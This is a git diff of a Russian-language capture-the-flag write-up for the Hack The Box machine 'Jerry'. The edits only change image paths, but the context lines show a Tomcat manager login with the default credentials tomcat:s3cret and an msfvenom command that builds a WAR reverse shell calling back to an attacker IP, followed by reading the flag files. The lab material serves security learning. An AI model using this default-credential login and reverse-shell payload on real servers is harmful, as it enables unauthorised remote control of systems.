@@ -1,6 +1,6 @@
 # 🟢 Jerry(Windows, Easy)
 
-![](<../.gitbook/assets/1 (1) (1).png>)
+![](<../.gitbook/assets/1 (1) (1) (1).png>)
 
 ### Содержание:
 
@@ -25,13 +25,13 @@ PORT     STATE SERVICE VERSION
 
 На 8080 порту мы видим tomcat:
 
-![](<../.gitbook/assets/2 (1) (1).png>)
+![](<../.gitbook/assets/2 (1) (1) (1).png>)
 
 Можем перейти на /manager/html и использовать дефолтные креды, чтобы попасть в панель админа:
 
 `tomcat:s3cret`
 
-![](<../.gitbook/assets/3 (1) (1) (1).png>)
+![](<../.gitbook/assets/3 (1) (1) (1) (1).png>)
 
 ### Создаем war эксплоит с помощью msfvenom:
 
@@ -41,7 +41,7 @@ $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.43 LPORT=9898 -f war > s
 
 Загружаем в tomcat:
 
-![](<../.gitbook/assets/4 (1).png>)
+![](<../.gitbook/assets/4 (1) (1).png>)
 
 Ставим листенер:
 
@@ -58,4 +58,4 @@ C:\Users\Administrator\Desktop\flags>type "C:\Users\Administrator\Desktop\flags\
 type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
 ```
 
-![](../.gitbook/assets/5.png)
+![](<../.gitbook/assets/5 (4).png>)
